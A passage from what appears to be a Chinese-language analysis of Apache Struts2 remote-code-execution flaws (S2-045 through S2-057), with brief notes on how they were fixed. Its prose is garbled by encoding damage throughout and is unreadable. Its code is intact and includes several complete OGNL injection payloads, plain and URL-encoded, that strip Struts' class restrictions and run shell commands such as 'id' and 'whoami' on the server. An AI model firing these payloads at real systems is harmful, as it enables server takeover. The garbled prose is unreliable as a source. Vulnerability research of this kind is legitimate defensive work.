‰ΩøÁî®‰∫ÜÊ≠£ÂàôÔºåÈò≤Ê≠¢Âá∫Áé∞(#@)Á≠âÁâπÊÆäÂ≠óÁ¨¶ÔºåÂá∫Áé∞Â∞±Êä•ÈîôÔºå‰πüÂ∞±Âà∞‰∏ç‰∫ÜÂêéÁª≠ÁöÑOGNLË°®ËææÂºèÁöÑÊâßË°å Âπ∂‰∏îÂú®Á¶ÅÊ≠¢ÁöÑclassÂàóË°®ÈáåÂ¢ûÂä†‰∫Ü‰∏§‰∏™ ‰ΩøÂæóÊàë‰ª¨‰∏çËÉΩÂú®Áî®`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`Êù•ÁªïËøáÈôêÂà∂ ‰∏Ä‰∏™ÊúâÊÑèÊÄùÁöÑÂú∞ÊñπÂâçÈù¢ËØ¥Âà∞Ëøô3‰∏™ÊºèÊ¥ûÈúÄË¶ÅÂºÄÂêØDynamicMethodInvocationÔºåÂÖ∂ÂÆû‰∏çÂºÄÂêØ‰πüÊòØÂèØ‰ª•ÁöÑ ÂâçÈù¢ËØ¥ÁöÑÂá†ÁßçÊñπÊ≥ïÈÉΩÊòØÂú®Â§ÑÁêÜname!methodËøô‰∏™Ê†ºÂºèÔºårestÂÖ∂ÂÆûËøòÊîØÊåÅÂØπaction/id/methodÁöÑËß£Êûê ÊâÄ‰ª•ÊîπÊîπPOCÂ∞±ËÉΩÈÄöÊùÄrest-plugin‰∫Ü 1http://localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig 14. S2-045/S2-046ÂΩ±ÂìçÁâàÊú¨ÔºöStruts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 S2-046ÂéüÁêÜ‰∏ÄÊ†∑ÔºåËøôÈáåÂè™ÂàÜÊûêS2-045 ËøôÈáå2.3Âíå2.5ÁâàÊú¨ÂèòÂåñÊØîËæÉÂ§ßÔºåËøôÈáå‰ª•2.3.31ÁöÑ‰ª£Á†ÅÂàÜÊûêÔºåÁúã2.5ÁöÑÂèØ‰ª•Áúãhttps://paper.seebug.org/247/ ‰ªéstruts2ÁöÑÂ∑•‰ΩúÊµÅÁ®ãÂõæÊù•ÁúãÔºåÊâÄÊúâÁöÑËØ∑Ê±ÇÂú®ÁîüÊàêActionProxy‰πãÂâçÔºåÈÉΩÁî±FilterDispatcherÊù•Â§ÑÁêÜÔºå2.3ÁâàÊú¨Áî®ÁöÑÊòØorg.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilterÔºåËøôÈáåÂú®Ë∞ÉÁî®action‰πãÂâç‰ºöÂÖàÂ∞ÅË£Örequest„ÄÇ ÁúãÁúãË∞ÉÁî®Ê†à Â∞ÅË£ÖÂÆûÈôÖÁî±org.apache.struts2.dispatcher.Dispatcher#wrapRequestÂ§ÑÁêÜ ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂú®Â§ÑÁêÜContent-Type: multipart/form-dataÁ±ªÂûãÊó∂Ôºå‰ºöÁîüÊàêorg.apache.struts2.dispatcher.multipart.MultiPartRequestWrapperÂ§ÑÁêÜÔºåS2-045Â∞±ÊòØÂá∫ÈóÆÈ¢òÂú®ËøôÈáå Âú®Áî®JakartaMultiPartRequestËß£ÊûêrequestÂåÖÊó∂ÔºåË∞ÉÁî®org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImplÊù•Ê£ÄÊü•Content-TypeÁöÑÂÜÖÂÆπÔºåÈúÄË¶ÅÁî±multipart/ÂºÄÂ§¥ÊâçË°åÔºå‰∏çÁÑ∂Â∞±ÊòØÊä•ÈîôÂπ∂Â∞ÜÂÖ∑‰ΩìÁöÑcontentTypeÂÜÖÂÆπÂÜôÂà∞ÂºÇÂ∏∏Èáå ËøôÈáåÊàë‰ª¨ÁöÑÂèØÊéßÊï∞ÊçÆÂ∞±Âà∞‰∫ÜÂºÇÂ∏∏‰∏äÔºåÂ∞±Áúãstruts2ÊòØÊÄé‰πàÂ§ÑÁêÜÂºÇÂ∏∏‰∫Ü org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse ÂèØÊéßÂÜÖÂÆπ‰º†ÂÖ•‰∫Ücom.opensymphony.xwork2.util.LocalizedTextUtil#findText ÂΩìÂâçÈÉΩÊ≤°ÁîüÊàêÈîôËØØ‰ø°ÊÅØÊó∂ÔºåÂ∞ÜËé∑ÂèñÈªòËÆ§ÁöÑmessage ËøôÈáåÂà∞‰∫ÜÊàë‰ª¨ÁÜüÊÇâÁöÑTextParseUtil.translateVariablesÂáΩÊï∞Ôºå‰ªñÂêéÁª≠‰ºöÂ§ÑÁêÜËÆ°ÁÆóOGNLË°®ËææÂºè ÁÆÄÂçïÊù•ËØ¥ÔºåÊï¥‰∏™ËøáÁ®ã‰ªéÊä•ÈîôÂºÄÂßãÂ≠òÂÖ•OGNLË°®ËææÂºèÔºåÂÜçÁîüÊàêÈîôËØØ‰ø°ÊÅØÁöÑÊó∂ÂÄôËÆ°ÁÆó‰∫ÜOGNLË°®ËææÂºè Âà∞‰∫ÜËøôÈáåÊâßË°åÂèØÊéßÁöÑOGNLË°®ËææÂºèÊòØÁ¨¨‰∏ÄÊ≠•ÔºåÂõ†‰∏∫2.3.29Â¢ûÂä†‰∫ÜÂØπ`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`ÁöÑÈôêÂà∂ ÈúÄË¶Å‰∏ÄÁßçÊñ∞ÁöÑÊÄùË∑ØÊù•ÁªïËøáÔºåS2-045ÁöÑPOCÂ∞±ÁªôÊàë‰ª¨Êèê‰æõËøôÊ†∑‰∏Ä‰∏™ÊÄùË∑Ø POC1234567891011121314151617181920%&#123;(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm): ( (#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). (#ognlUtil.getExcludedPackageNames().clear()). (#ognlUtil.getExcludedClasses().clear()). (#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; ‰∏ªË¶ÅÁúã5-10Ë°åÔºå‰∏ÄÂºÄÂßãÁöÑÊÄùË∑ØÊòØÁõ¥Êé•Áî®ËµãÂÄºÁöÑÊñπÂºèÊù•Ë¶ÜÁõñÂ≠òÂú®ÈôêÂà∂ÁöÑSecurityMemberAccessÔºå‰ΩÜÊòØÁé∞Âú®Êúâ‰∫ÜexcludedClassesÁöÑÈôêÂà∂‰∏çËÉΩÁõ¥Êé•Áî®ËøôÁßçÊñπÂºèÊù•ËææÊàêÔºàÂÖ∑‰ΩìÁúãSecurityMemberAccess.isAccessibleÔºâ„ÄÇ ÈÇ£‰πàÂ∞±ÁúãÁúãËÉΩ‰∏çËÉΩÁî®settersÂéªËÆæÁΩÆSecurityMemberAccess ËøôÈáåÂ∞±Áúãognl.OgnlContext#setMemberAccessÔºåËÄåËøô‰∏™contextÂ∞±ÊòØÊàë‰ª¨Âú®OGNLË°®ËææÂºèÈáåÁî®#contextË°®Á§∫ÁöÑ ÈÇ£‰πàÁõ¥Êé•Áî®#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)Â∞±ÂèØ‰ª•Ë¶ÜÁõñÂéüÊúâÁöÑMemberAccessÔºå‰ΩÜÊòØÂõ†‰∏∫#contextÊú¨Ë∫´Â∞±ÊòØË¢´Á¶ÅÊ≠¢ÁöÑÁ±ªÔºåÊàë‰ª¨‰∏çËÉΩÁõ¥Êé•Ë∞ÉÁî®‰ªñ„ÄÇ Êàë‰ª¨ÈúÄË¶ÅÈ¶ñÂÖàÂéªÈô§ÊéâExcludedPackageNamesÂíåExcludedClasses Êù•ÁúãÁúã‰ªñÊòØÊÄé‰πàËÆæÁΩÆÁöÑcom.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil ÂèØ‰ª•ÁúãÂà∞securityMemberAccessÁöÑÁõ∏ÂÖ≥Á¶ÅÁî®ËÆæÁΩÆÈÉΩÊòØÊù•Ëá™‰∫éognlUtilÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨Âè™ÈúÄË¶ÅÊ∏ÖÈô§ÊéâognlUtilÁöÑÁ¶ÅÁî®ËÆæÁΩÆÂ∞±ÂèØ‰ª•Ê∂àÈô§ÊéâsecurityMemberAccessÁöÑÈôêÂà∂„ÄÇËøôÊòØÂõ†‰∏∫Âú®jvmÈáåÈù¢‰ªñ‰ª¨Áî®ÁöÑÈÉΩÊòØÂêå‰∏Ä‰∏™ÂÆû‰æã„ÄÇ ÊâÄ‰ª•‰∏äÈù¢ÁöÑPOC‰∏≠Áî®struts2ÁöÑcontainerÁöÑÊñπÂºèÂéªËé∑ÂèñognlUtilÂÆû‰æãÔºåÂπ∂Â∞ÜÂÖ∂Á¶ÅÁî®ËÆæÁΩÆÂÖ®ÈÉ®Ê∏ÖÈô§Êéâ ÈÇ£‰πàÂêéÈù¢ÂÜçÁî®#context.setMemberAccessÂ∞±Ê≤°ÊúâÈòªÁ¢ç‰∫Ü ÂêéÁª≠ÁöÑ‰ª£Á†ÅÂ∞±ÊòØÊâßË°åÂπ∂ÂõûÊòæ‰∫ÜÔºåË∑üÂâçÈù¢ÁöÑÁ±ª‰ºº ‰øÆÂ§ç ‰øÆÂ§ç‰∏ªË¶ÅÊòØ‰∏çÊäämessage‰º†ÂÖ•ÔºåÊîæÂà∞‰∫ÜargsÁöÑ‰ΩçÁΩÆ 15. S2-048Ëøô‰∏ÄÈÉ®ÂàÜ‰∏ç‰ªîÁªÜËØ¥‰∫ÜÔºåÁúãhttps://www.freebuf.com/vuls/217482.html 16. S2-052ÂΩ±ÂìçËåÉÂõ¥:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12 The REST Plugin is using a XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads. struts2ÁöÑrestÊèí‰ª∂Ê≥®ÂÜå‰∫ÜContentTypeInterceptorÊù•Â§ÑÁêÜ‰∏çÂêåÁöÑcontent-type ÈíàÂØπxmlÁ±ªÂûãÔºåÂ∞ÜË∞ÉÁî®XStreamHandlerÊù•Â§ÑÁêÜ org.apache.struts2.rest.ContentTypeInterceptor#intercept Ê†πÊçÆrequestËØ∑Ê±ÇÈÄâÊã©handlerÔºåËøôÈáåÊàë‰ª¨‰º†ÂÖ•application/xmlÁ±ªÂûãÔºåÂ∞Ü‰ΩøÁî®org.apache.struts2.rest.handler.XStreamHandler#toObjectÊù•Â§ÑÁêÜxml ËøôÈáåÁî®‰∫ÜÊúÄÁÆÄÂçïÁöÑË∞ÉÁî®ÊñπÂºèÔºà1.4.8ÁâàÊú¨ÔºâÔºåÊ≤°ÊúâÂÅöxstreamÁöÑÁõ∏ÂÖ≥ÂÆâÂÖ®Â§ÑÁêÜÔºåÂØºËá¥XStreamÂèçÂ∫èÂàóÂåñ ÊâÄ‰ª•Êàë‰ª¨‰º†ÂÖ•ÊûÑÈÄ†Â•ΩÁöÑXMLÂ∞±ÂèØ‰ª•ËææÂà∞ÂëΩ‰ª§ÊâßË°å POCËøôÈáåÁöÑxmlÂèØ‰ª•Áî®ÊàëÁöÑysomapÂéªÁîüÊàêÔºåÊääContent-TypeËÆæÁΩÆÊàêapplication/xmlÂ∞±ÂèØ‰ª•‰∫Ü ‰øÆÂ§çS2-052Ë∑ü‰ª•ÂæÄÁöÑÊºèÊ¥û‰∏ç‰∏ÄÊ†∑ÔºåËøôÈáåË∑üOGNLË°®ËææÂºèÂπ∂Ê≤°Êúâ‰ªÄ‰πàÂÖ≥Á≥ª‰∫ÜÔºå‰øÆÂ§ç‰πüÊØîËæÉÁÆÄÂçï ÂçáÁ∫ßXStreamÂà∞‰∫Ü1.4.10ÁâàÊú¨ÔºåÂπ∂‰∏îÊ∑ªÂä†‰∫ÜÂÆâÂÖ®Êé™ÊñΩ ËøôÈáåÊñ∞Ê∑ªÂä†‰∫ÜAllowedClasses„ÄÅAllowedClassNames„ÄÅXStreamPermissionProviderÊù•ËÆæÁΩÆÊØè‰∏™Á±ªÂèØ‰ª•ÂèçÂ∫èÂàóÂåñÁöÑÂØπË±°ÂàóË°® ‰πü‰ºöÊ∑ªÂä†‰∏Ä‰∫õÈªòËÆ§ÁöÑÁ±ª ËøôÈáåÁöÑÁî®Ê≥ïÂ∞±ÊòØXStreamÂÆòÊñπÊé®ËçêÁöÑÔºåÈááÁî®ÁôΩÂêçÂçïÁöÑÊñπÂºèÊù•Èò≤Ê≠¢‰∏çÂÆâÂÖ®ÁöÑÂèçÂ∫èÂàóÂåñ 17. S2-053ÂΩ±ÂìçÁâàÊú¨:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1 S2-053ÈóÆÈ¢òÂá∫Âú®freemarkerÁöÑÊ†áÁ≠æÂÜÖÂÆπÂèØÊéßÊó∂Âá∫Áé∞ÁöÑÈóÆÈ¢ò Âú®actionÊâßË°åÁªìÊùüÂêéÔºåÁî±‰∫éËÆæÁΩÆÁöÑÁ±ªÂûã‰∏∫freemarkerÔºåÊâÄ‰ª•ÁªìÊûú‰∫§Áî±freemarkerÊù•Â§ÑÁêÜ ÂÖ≥Ê≥®ÂØπfreemarkerÊ†áÁ≠æËß£ÊûêÁöÑÁ±ªorg.apache.struts2.views.freemarker.tags.CallbackWriter#onStart Âõ†‰∏∫ËøôÈáåÊàë‰ª¨Êó∂urlÊ†áÁ≠æÔºåÊâÄ‰ª•Áî±org.apache.struts2.components.URL#startÊù•Â§ÑÁêÜ ÂõûÂà∞‰∫ÜÁî±ServletUrlRendererÊù•Ëß£ÊûêÊàë‰ª¨‰º†ÂÖ•ÁöÑOGNLË°®ËææÂºèÔºåË∑üS2-013‰∏ÄÊ†∑ÔºåÂêéÁª≠‰πüÊòØÁî±TextParseUtil.translateVariablesËß¶ÂèëÁöÑ POCpocÂèØ‰ª•Áõ¥Êé•Áî®S2-045ÁöÑpoc 12%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;// ËÆ∞ÂæóÁºñÁ†Å ‰øÆÂ§ç ËøôÊ¨°ÁöÑ‰øÆÂ§çÊòØÂú®FreemarkerManager‰∏≠Â§ö‰∫Ü‰∏§Ë°å‰ª£Á†ÅÔºå 123&gt; LOG.debug(&quot;Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER&quot;, new String[0]);&gt; configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);&gt; ÂéªÁúã‰∫Ü‰∏Ä‰∏ãTemplateClassResolver.SAFER_RESOLVER)ÁöÑÂÆòÊñπÊñáÊ°£Ôºå 12&gt; TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.&gt; Â§ßËá¥ÊÑèÊÄùÂ∫îËØ•Â∞±ÊòØÁ¶ÅÊ≠¢‰∫ÜfreemarkerÁöÑRCEÔºåÂÖ∑‰ΩìÊàëÂØπfreemarker‰∏çÂ§™‰∫ÜËß£ÔºåÂ∞±‰∏çÂéªËØØ‰∫∫Â≠êÂºü‰∫Ü„ÄÇ ‰øÆÂ§çÁõ¥Êé•ÂèÇËÄÉhttps://www.freebuf.com/vuls/217482.html 18. S2-055ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts 2.5 - Struts 2.5.14 S2-055ÊºèÊ¥ûÂéüÁêÜË∑üS2-052‰∏ÄÊ†∑ÔºåÁî±jacksonÂ∫ìÂ§ÑÁêÜjsonÂÜÖÂÆπÊó∂‰∫ßÁîüÁöÑÊºèÊ¥ûÔºåËøôÈáåÈªòËÆ§‰∏çÊòØÁî®jacksonÂ§ÑÁêÜjsonÂÜÖÂÆπÁöÑÔºåÂæóÂú®struts.xmlÈÖçÁΩÆ 12&lt;bean type=\"org.apache.struts2.rest.handler.ContentTypeHandler\" name=\"jackson\" class=\"org.apache.struts2.rest.handler.JacksonLibHandler\"/&gt; &lt;constant name=\"struts.rest.handlerOverride.json\" value=\"jackson\"/&gt; ËøôÈáåÊú¨Ë∫´ÊòØÂõ†‰∏∫jacksonÂèçÂ∫èÂàóÂåñÈóÆÈ¢ò‰∫ßÁîüÁöÑÔºåÂêéÈù¢ÊäΩÁ©∫ÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™jacksonÔºåËøôÈáå‰∏çÁªßÁª≠ÂàÜÊûê‰∫Ü Âõ†‰∏∫ÈúÄË¶ÅÈÖçÁΩÆÊâçÂèØ‰ª•ÊâìÔºåÊâÄ‰ª•ËøôÈáåÁöÑÂç±ÂÆ≥Âπ∂Ê≤°ÊúâÊÉ≥xstream‰∏ÄÊ†∑‰∏•Èáç ÂÖ∑‰ΩìÂàÜÊûêËßÅhttp://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/ 19. S2-057ÂΩ±ÂìçËåÉÂõ¥ÔºöStruts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16 Âåó‰∫¨Êó∂Èó¥8Êúà22Êó•13Êó∂ÔºåApacheÂÆòÊñπÂèëÂ∏ÉÈÄöÂëäÂÖ¨Â∏É‰∫ÜStruts2‰∏≠‰∏Ä‰∏™ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºàCVE-2018-11776Ôºâ„ÄÇËØ•ÊºèÊ¥ûÂú®‰∏§ÁßçÊÉÖÂÜµ‰∏ãÂ≠òÂú®ÔºåÁ¨¨‰∏ÄÔºåÂú®xmlÈÖçÁΩÆ‰∏≠Êú™ËÆæÁΩÆnamespaceÂÄºÔºå‰∏î‰∏äÂ±ÇÂä®‰ΩúÈÖçÁΩÆÔºàupper action(s) configurationsÔºâ‰∏≠Êú™ËÆæÁΩÆÊàñÁî®ÈÄöÈÖçÁ¨¶namespaceÂÄº„ÄÇÁ¨¨‰∫åÔºå‰ΩøÁî®Êú™ËÆæÁΩÆ valueÂíåactionÂÄºÁöÑurlÊ†áÁ≠æÔºå‰∏î‰∏äÂ±ÇÂä®‰ΩúÈÖçÁΩÆÔºàupper action(s) configurationsÔºâ‰∏≠Êú™ËÆæÁΩÆÊàñÁî®ÈÄöÈÖçÁ¨¶namespaceÂÄº„ÄÇ https://paper.seebug.org/682/ ËøôÈáå‰∏ÄÁßçÈÖçÁΩÆÊñπÊ°àÊòØ Ê≤°ÊúâÈÖçÁΩÆnamespaceÔºåËÆøÈóÆs2057.actionÈÉΩ‰ºöÂØºÂêëtest.actionÔºåËøôÈáåÂ§ÑÁêÜredirectActionÁöÑÊòØ org.apache.struts2.dispatcher.ServletActionRedirectResult#execute ServletActionRedirectResult‰ºöÂ∞Ünamespace‰∏ÄËµ∑ÊãºÊé•ËøõlocationÔºåÊØîÂ¶Ç/s2vuls/${1*2}/s2057.action,ÂÖ∂namespace‰∏∫/${1*2},actionName‰∏∫Ë∑≥ËΩ¨ÁöÑtestÔºåÊúÄÁªàlocation‰∏∫/${1*2}/test.action„ÄÇÂà∞ËøôÈáåÊàë‰ª¨Â∞±ÂºïÂÖ•‰∫ÜOGNLË°®ËææÂºèÔºåÁúãÂêéÁª≠ÁöÑ‰∏Ä‰∏™Â§ÑÁêÜ org.apache.struts2.dispatcher.StrutsResultSupport#execute Âà∞ËøôÈáåÔºåÂ∞±ÂºÄÂßãÁÜüÊÇâËµ∑Êù•‰∫ÜÔºåÂ∞±ÊòØS2-012ÁöÑÊºèÊ¥ûËß¶ÂèëÁÇπ ‰º†ÂÖ•‰∫ÜTextParseUtil.translateVariablesÔºåÂà∞ËøôÈáåÂ∞±ÁªìÊùü‰∫ÜÔºåÂêéÁª≠Â∞ÜË∞ÉÁî®OGNL.getValue POCÂú®2.3.xÁâàÊú¨ÔºåÂèØ‰ª•Áõ¥Êé•Áî®S2-045ÁöÑpocÊâì 1/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action ËÄåÂØπ‰∫é2.5.xÁâàÊú¨ÔºåÊàë‰ª¨ÈúÄË¶ÅÂ•ΩÂ•ΩÂàÜÊûê‰∏Ä‰∏ã 123456789101112131415$&#123;(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses('')).(#ou.setExcludedPackageNames('')).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct.setMemberAccess(#dm)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; ‰ªépocÊù•ÁúãÔºå‰ªéÁ¨¨7Ë°åÂºÄÂßãÈÉΩÊòØÊàë‰ª¨ÁÜüÊÇâÁöÑÊìç‰ΩúÔºåÈÇ£‰πàÂâçÈù¢Â§ö‰∫ÜÈÇ£‰πàÂ§öÊòØÂú®ÂÅö‰ªÄ‰πàÔºü ÂèÇËÄÉÔºöhttps://paper.seebug.org/794/#35-struts-2516 Âú®struts2 2.5.13ÁâàÊú¨‰πãÂêéÔºåognlÂ∫ìËøõË°å‰∫ÜÊõ¥Êñ∞Ôºå‰ªé3.1.12-&gt;3.1.15ÔºåÂÖ∂‰∏ªË¶ÅÁöÑ‰∏Ä‰∏™ÂèòÂåñÊòØÁ¶ÅÊ≠¢ËÆøÈóÆcontext.mapÔºåOgnlContextÁöÑget„ÄÅput„ÄÅremoveÂáΩÊï∞‰∏≠ÈÉΩÂà†Èô§‰∫ÜÂØπÂΩìÂâçcontextÁöÑÊìç‰Ωú Ê≠§Â§ñÔºåexcludedÁõ∏ÂÖ≥ÁöÑÈõÜÂêàË¢´ËÆæÁΩÆ‰∏∫‰∏çÂèØÂèòÔºåÊó†Ê≥ïÈÄöËøáclearÁöÑÊñπÂºèÊù•Ê∏ÖÈô§ ÈíàÂØπ‰∏äÈù¢‰∏§ÁßçÁöÑÁªïËøá ÊñáÁ´†ÊèêÂá∫‰∫ÜËøô‰πà‰∏ÄÁßçÊÄùË∑Ø: Ê≤°ÊúâÂäûÊ≥ï‰ΩøÁî®context.mapÔºåÂèØ‰ª•Ë∞ÉÁî®attrÔºåÂâçÊñáËØ¥Ëøáattr‰∏≠‰øùÂ≠òÁùÄÊï¥‰∏™contextÁöÑÂèòÈáè‰∏éÊñπÊ≥ïÔºåÂèØ‰ª•ÈÄöËøáattr‰∏≠ÁöÑÊñπÊ≥ïËøîÂõûÁªôÊàë‰ª¨‰∏Ä‰∏™context.map„ÄÇ Ê≤°ÊúâÂäûÊ≥ïÁõ¥Êé•Ë∞ÉÁî®excludedClassesÔºå‰πüÂ∞±‰∏çËÉΩ‰ΩøÁî®clearÊñπÊ≥ïÊù•Ê∏ÖÁ©∫Ôºå‰ΩÜÊòØËøòÂèØ‰ª•Âà©Áî®setterÊù•ÊääexcludedClassesÁªôËÆæÁΩÆÊàêÁ©∫ Ê∏ÖÁ©∫‰∫ÜÈªëÂêçÂçïÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®DefaultMemberAccessÊù•Ë¶ÜÁõñ_memberAccessÔºåÊù•ÊâßË°åÈùôÊÄÅÊñπÊ≥ï‰∫Ü„ÄÇ ËÄåËøôÈáåÂèà‰ºöÂá∫Áé∞‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂΩìÊàë‰ª¨‰ΩøÁî®OgnlUtilÁöÑsetExcludedClassesÂíåsetExcludedPackageNamesÂ∞ÜÈªëÂêçÂçïÁΩÆÁ©∫Êó∂Âπ∂ÈùûÊòØÂØπ‰∫éÊ∫êÔºàÂÖ®Â±ÄÁöÑOgnlUtilÔºâËøõË°åÁΩÆÁ©∫Ôºå‰πüÂ∞±ÊòØËØ¥_memberAccessÊòØÊ∫êÊï∞ÊçÆÁöÑ‰∏Ä‰∏™ÂºïÁî®ÔºåÂ∞±ÂÉèÂâçÊñáÊâÄËØ¥ÁöÑÔºåÂú®ÊØèÊ¨°createActionÊó∂ÈÉΩÊòØÈÄöËøásetOgnlUtilÂà©Áî®ÂÖ®Â±ÄÁöÑÊ∫êÊï∞ÊçÆÂàõÂª∫‰∏Ä‰∏™ÂºïÁî®ÔºåËøô‰∏™ÂºïÁî®Â∞±ÊòØ‰∏Ä‰∏™MemberAccessÂØπË±°Ôºå‰πüÂ∞±ÊòØ_memberAccess„ÄÇÊâÄ‰ª•ËøôÈáåÂè™‰ºöÂΩ±ÂìçËøôÊ¨°ËØ∑Ê±ÇÁöÑOgnlUtilËÄåÂπ∂Êú™ÈáçÊñ∞ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑ_memberAccessÂØπË±°ÔºåÊâÄ‰ª•ÊóßÁöÑ_memberAccessÂØπË±°‰ªçÊú™ÊîπÂèò„ÄÇ ËÄåÁ™ÅÁ†¥ËøôÁßçÈôêÂà∂ÁöÑÊñπÂºèÂ∞±ÊòØÂÜçÊ¨°ÂèëÈÄÅ‰∏Ä‰∏™ËØ∑Ê±ÇÔºåÂ∞Ü‰∏ä‰∏ÄÊ¨°ËØ∑Ê±ÇÂ∑≤ÁªèÁΩÆÁ©∫ÁöÑOgnlUitl‰Ωú‰∏∫Ê∫êÈáçÊñ∞ÂàõÂª∫‰∏Ä‰∏™_memberAccessÔºåËøôÊ†∑Âú®Á¨¨‰∫åÊ¨°ËØ∑Ê±Ç‰∏≠_memberAccessÂ∞±ÊòØÈªëÂêçÂçïË¢´ÁΩÆÁ©∫ÁöÑÊÉÖÂÜµÔºåËøô‰∏™Êó∂ÂÄôÂ∞±ÈáäÊîæ‰∫ÜDefaultMemberAccessÔºåÂ∞±ÂèØ‰ª•ËøõË°åÊ≠£Â∏∏ÁöÑË¶ÜÁõñ‰ª•ÂèäÊâßË°åÈùôÊÄÅÊñπÊ≥ï„ÄÇ ÁúãËøá‰∏äÈù¢ÁöÑÂàÜÊûêÂêéÂÜçÊù•ÁúãpocÔºåÁ¨¨‰∫åË°åËé∑Âèñ‰∫ÜcontextÔºåÁ¨¨3 4 5 